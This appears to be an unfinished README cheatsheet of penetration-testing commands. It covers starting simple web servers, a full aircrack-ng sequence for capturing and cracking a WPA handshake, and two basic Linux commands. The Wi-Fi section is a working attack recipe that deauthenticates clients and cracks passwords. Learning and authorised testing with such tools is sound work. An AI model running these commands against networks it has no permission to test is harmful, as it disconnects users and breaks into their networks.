# penetration-testing-useful-commands

This page is a toolbox cheatsheet to help you for penetration testing.

## Contributions are welcome!

Feel free to submit a pull request, with anything from small fixes to tools you'd like to add. If adding a new tool, **please add a brief description** that you think new penetration tester would understand.

## Table of Contents

### Infrastructure
- [HTTP Web Server](#HTTPWebServer)
- [Wi-Fi](#Wi-fi)
- [Linux](#Linux)

### Tools
- [Tool 1](#Tool1)
- [Tool 2](#Tool2)
- [Tool 3](#Tool3)

### HTTP Web Server

Start a HTTP Web Server:
```bash
php -S 0.0.0.0:8080 # PHP
python -m http.server 8080 # Python

npm install http-server -g # NodeJS
http-server -p 8080  # NodeJS
```
### Wi-Fi

List all the available network Interfaces:
```bash
airmon-ng
```
Monitor the desired network interface:
```bash
airmon-ng start wlan0 
```
Capture the network interface traffic:
```bash
airodump-ng wlan0mon
```
Capture required data from the specific network:
```bash
airodump-ng --bssid 09:98:98:98:98:98 -c 1 --write psk wlan0mon
```
De-authenticate the client:
```bash
aireplay-ng --deauth 100 -a 09:98:98:98:98:98 wlan0mon
```
Verify the captured handshake file:
```bash
ls
```
Stop Wi-Fi interface monitoring:
```bash
airmon-ng stop wlan0mon
```
Cracking password from the captured handshake file:
```bash
aircrack-ng -w wordlist psk*.cap
```

### Linux

Index number, or inode, is a number that is unique to a file in the Unix filesystem:
```bash
0x4a756a75@nixfund:/etc$ ls -i | grep sudoers
147627 sudoers
```
We can look at the whole structure after creating the parent directories with the tool tree . :
```bash
0x4a756a75@htb[/htb]$ tree .
```
